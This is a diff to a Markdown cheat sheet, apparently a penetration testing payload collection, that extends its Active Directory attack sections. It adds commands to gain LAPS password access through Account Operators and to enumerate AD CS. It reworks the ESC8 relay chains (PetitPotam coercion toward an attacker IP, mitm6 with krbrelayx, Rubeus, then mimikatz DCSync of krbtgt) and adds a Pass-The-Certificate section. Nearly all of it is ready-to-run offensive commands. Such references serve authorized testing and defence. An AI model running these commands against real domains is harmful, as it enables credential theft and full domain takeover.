@@ -82,6 +82,7 @@
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
+      - [Pass-The-Certificate](#pass-the-certificate)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -230,13 +231,13 @@ Use the correct collector
   # run the collector on the machine using SharpHound.exe
   # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
   # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
-  .\SharpHound.exe -c all -d active.htb -SearchForest
-  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
-  .\SharpHound.exe -c all,GPOLocalGroup
+  .\SharpHound.exe -c all -d active.htb --searchforest
+  .\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default
+  .\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)
+
   .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
-  .\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100 -d active.htb
   .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
-  .\SharpHound.exe -c all,GPOLocalGroup --searchforest
 
   # or run the collector on the machine using Powershell
   # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
@@ -1466,7 +1467,15 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
       ```bash
       ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
       ```
-     
+
+#### Grant LAPS Access
+The members of the group **"Account Operator"** can add and modify all the non admin users and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password
+
+```ps1
+Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
+Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
+```
+
 
 ### Reading GMSA Password
 
@@ -2230,7 +2239,9 @@ secretsdump.py -k -no-pass target.lab.local
 
 ### Active Directory Certificate Services
 
-* Find ADCS Server : `crackmapexec ldap domain.lab -u username -p password -M adcs`
+* Find ADCS Server
+  * `crackmapexec ldap domain.lab -u username -p password -M adcs`
+  * `ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName`
 * Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`
 
 #### ESC1 - Misconfigured Certificate Templates
@@ -2247,8 +2258,10 @@ Exploitation:
     ```ps1
     Certify.exe find /vulnerable
     Certify.exe find /vulnerable /currentuser
-    or
+    # or
     PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
+    # or
+    certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
     ```
 * Use Certify, [Certi](https://github.com/eloypgz/certi) or [Certipy](https://github.com/ly4k/Certipy) to request a Certificate and add an alternative name (user to impersonate)
     ```ps1
@@ -2394,64 +2407,75 @@ Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /
 
 Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
 
-* Version 1: NTLM Relay + Rubeus + PetitPotam
-    ```powershell
-    impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
-    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
-    # For a member server or workstation, the template would be "Computer".
-    # Other templates: workstation, DomainController, Machine, KerberosAuthentication
+* **Version 1**: NTLM Relay + Rubeus + PetitPotam
+  ```powershell
+  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
+  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
+  # For a member server or workstation, the template would be "Computer".
+  # Other templates: workstation, DomainController, Machine, KerberosAuthentication
 
-    # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
-    # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
-    git clone https://github.com/topotam/PetitPotam
-    python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
-    python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
-    python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
-    python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
+  # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
+  # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
+  git clone https://github.com/topotam/PetitPotam
+  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
+  python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
+  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
 
-    # Use the certificate with rubeus to request a TGT
-    Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
-    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
+  # Use the certificate with rubeus to request a TGT
+  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
+  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
 
-    # Now you can use the TGT to perform a DCSync
-    mimikatz> lsadump::dcsync /user:krbtgt
-    ```
+  # Now you can use the TGT to perform a DCSync
+  mimikatz> lsadump::dcsync /user:krbtgt
+  ```
 
-* Version 2: NTLM Relay + Mimikatz + Kekeo
-    ```powershell
-    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+* **Version 2**: NTLM Relay + Mimikatz + Kekeo
+  ```powershell
+  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
-    # Mimikatz
-    mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth
+  # Mimikatz
+  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth
 
-    # Kekeo
-    kekeo> base64 /input:on
-    kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
+  # Kekeo
+  kekeo> base64 /input:on
+  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
 
-    # Mimikatz
-    mimikatz> lsadump::dcsync /user:krbtgt
-    ```
-* Version 3: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.
-    ```powershell
-    https://github.com/bats3c/ADCSPwn
-    adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
-    adcspwn.exe --adcs cs.pwnlab.local
-    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
-    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
-    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
+  # Mimikatz
+  mimikatz> lsadump::dcsync /user:krbtgt
+  ```
 
-    # ADCSPwn arguments
-    adcs            -       This is the address of the AD CS server which authentication will be relayed to.
-    secure          -       Use HTTPS with the certificate service.
-    port            -       The port ADCSPwn will listen on.
-    remote          -       Remote machine to trigger authentication from.
-    username        -       Username for non-domain context.
-    password        -       Password for non-domain context.
-    dc              -       Domain controller to query for Certificate Templates (LDAP).
-    unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
-    output          -       Output path to store base64 generated crt.
-    ```
-* Version 4: Certipy ESC8
+* **Version 3**: Kerberos Relay
+  ```ps1
+  # Setup the relay
+  sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
+
+  # Run mitm6
+  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
+  ```
+
+* **Version 4**: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.
+  ```powershell
+  https://github.com/bats3c/ADCSPwn
+  adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
+  adcspwn.exe --adcs cs.pwnlab.local
+  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
+  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
+  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
+
+  # ADCSPwn arguments
+  adcs            -       This is the address of the AD CS server which authentication will be relayed to.
+  secure          -       Use HTTPS with the certificate service.
+  port            -       The port ADCSPwn will listen on.
+  remote          -       Remote machine to trigger authentication from.
+  username        -       Username for non-domain context.
+  password        -       Password for non-domain context.
+  dc              -       Domain controller to query for Certificate Templates (LDAP).
+  unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
+  output          -       Output path to store base64 generated crt.
+  ```
+
+* **Version 5**: Certipy ESC8
   ```ps1
   certipy relay -ca 172.16.19.100
   ```
@@ -2496,6 +2520,29 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
   ```
 
 
+#### Pass-The-Certificate
+
+* Windows
+  ```ps1
+  # Information about a cert file
+  certutil -v -dump admin.pfx
+
+  # From a Base64 PFX
+  Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+  ```
+* Linux
+  ```ps1
+  # Base64-encoded PFX certificate (string) (password can be set)
+  gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+  ​
+  # PEM certificate (file) + PEM private key (file)
+  gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+
+  # PFX certificate (file) + password (string, optionnal)
+  gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+  ```
+
+
 ### Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `"dminCount` attribute to `0` for the required object.
@@ -2515,6 +2562,7 @@ Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 # or
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
+
 
 #### AdminSDHolder Abuse
 
